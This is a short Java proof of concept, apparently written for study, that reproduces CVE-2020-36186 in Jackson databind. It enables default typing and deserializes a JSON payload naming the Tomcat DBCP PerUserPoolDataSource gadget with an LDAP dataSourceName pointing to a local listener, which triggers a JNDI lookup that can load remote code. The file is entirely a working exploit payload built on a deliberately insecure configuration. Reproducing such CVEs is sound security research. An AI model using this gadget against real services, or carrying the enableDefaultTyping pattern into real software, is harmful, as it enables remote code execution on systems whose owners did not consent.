package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;

/**
 * @BelongsProject: study_java
 * @BelongsPackage: jackson
 * @Author: Clown
 * @CreateTime: 2023-10-27  14:06
 */
public class CVE_2020_36186 {
    public static void main(String[] args) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
        String json = "[\"org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource\", {\"dataSourceName\":\"ldap://127.0.0.1:9090/T\"}]";
        Object obj = mapper.readValue(json, Object.class);
        mapper.writeValueAsString(obj);

    }
}
